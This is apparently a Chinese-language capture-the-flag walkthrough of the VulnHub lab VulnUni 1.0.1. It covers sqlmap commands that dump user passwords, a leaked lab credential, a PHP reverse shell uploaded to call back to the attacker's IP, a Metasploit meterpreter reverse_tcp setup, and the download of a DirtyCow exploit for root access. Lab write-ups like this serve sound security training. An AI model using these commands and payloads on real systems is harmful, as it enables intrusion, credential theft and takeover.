---
title: VulnUni:1.0.1 Walkthrough
date: 2020-04-30T20:14:21+08:00
author: 2hanx
layout: post
categories:
  - Vulnhub
---
### 主机识别

`netdiscover -i wlan0`

### 网络拓扑

| 计算机     | IP              |
| ------- | --------------- |
| Kali    | `192.168.1.107` |
| Vulnuni | `192.168.1.105` |

### 扫描端口和版本信息

`nmap -A 192.168.1.105`

![1.png](https://i.loli.net/2020/04/30/5jzvrqu7Ym6xZHe.png) 

### 访问Web并确认web应用

![2.png](https://i.loli.net/2020/04/30/SpsVNLcYn9rqBDW.png) 

### 使用 BurpSuite 高级功能扫描Web应用

我们使用 `dirb`、`dirsearch`这类基于字典的web应用扫描器很难获取web网站有哪些网页，因此可以使用 BurpSuite 的高级功能 **Discover Content** ，经过一段时间我们就可以得到大致 web site map ，发现登录页面

![3.png](https://i.loli.net/2020/04/30/HemNt1hDCMjsAyJ.png) 

根据页面信息，我们了解到该web应用是 **某eClass**， 经过OSINT查到该页面存在SQL注入，这样我们就可以进行Sqlmap注入了

![4.png](https://i.loli.net/2020/04/30/CSZF4xX76rkmGby.png) 

因此将该页面保存为_post.txt_，使用sqlmap进行SQL注入

![5.png](https://i.loli.net/2020/04/30/lbT7vUWgwJBxDpY.png) 

`sqlmap -r post.txt --dbs --batch`

`sqlmap -r post.txt -D eclass --tables --batch`

`sqlmap -r post.txt -D eclass -T user --columns --batch`

`sqlmap -r post.txt -D eclass -T user -C password --dump --batch`

![6.png](https://i.loli.net/2020/04/30/KGtjgf2IOAYbM1P.png) 

经过尝试，使用`admin:ilikecats89` 账号密码登录，下一步我们就找找是否有漏洞页面，最常见的就是文件上传漏洞获取webshell，同样是采用BP搜索（**Finder References**），不过将目标缩短在登录之后的页面

> 利用过滤功能（`type="file"`）可以快速定位到具有文件上传功能的网页 

![8.png](https://i.loli.net/2020/04/30/HXNpR7FSCdOWlo2.png) 

目标找到`http://vulnuni.local/vulnuni-eclass/modules/course_info/restore_course.php`

![7.png](https://i.loli.net/2020/04/30/B1WH7tFsAL8jkYO.png) 

更改 [php reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) 中的IP（`192.168.1.107`）和端口信息（`8866`）并且将其压缩上传，对于上传文件存在的路径，使用同样的方法定位在 _courses_ 目录下，访问该链接，并且在 kali 下开启监听端口

![9.png](https://i.loli.net/2020/04/30/YUay5DkfrqeniJC.png) 

`find / -name flag* -type f`

这里通过搜索 _flag_，定位到该目录下（_/home/vulnuni_），使用`cat`命令是可以读到flag的，不过为了完成完整的测试，目的是知道虚拟机的登录密码，因此需要将该会话建立在_msf_中，后续进行提权

### msf 建立会话

```bash
use exploit/multi/script/web_delivery
set target 1
set lhost 192.168.1.107
set payload php/meterpreter/reverse_tcp
set srvport 4455
exploit
```

![10.png](https://i.loli.net/2020/04/30/Vqt6c5uQmOsyKlF.png) 

通过将图中选中部分复制到临时会话中运行，我们（Kali）就会在 _meterpreter_ 建立了与该虚拟机的会话

![11.png](https://i.loli.net/2020/04/30/ZeGjQDwr2CatVFs.png) 

### 权限提升

Linux 环境下的权限提升大多根据内核版本进行提权，因此首要任务就是获取该虚拟机的内核版本，执行命令`uname -r`

![12.png](https://i.loli.net/2020/04/30/haXLrqxQ9WBuMpi.png) 

通过 OSINT，我们知道该内核存在漏洞 [DirtyCow](https://www.exploit-db.com/exploits/40616)，下载 exp，重命名为 _cowroot.c_ 源文件，在 Kali 上运行简单的HTTP服务器（`python3 -m http.server 8088`），将该源码传到虚拟机中

![13.png](https://i.loli.net/2020/04/30/Pzad4utvc7T8ZmE.png) 

根据源码里的操作可以将权限提至root 权限，查看密码文件得到了该虚拟机经过 SHA-256 加密的登录密码

![14.png](https://i.loli.net/2020/04/30/W7ky4djHesqaKSw.png) 

### Ref.

  * [hackingarticles](https://www.hackingarticles.in/vulnuni-1-0-1-vulnhub-walkthrough/)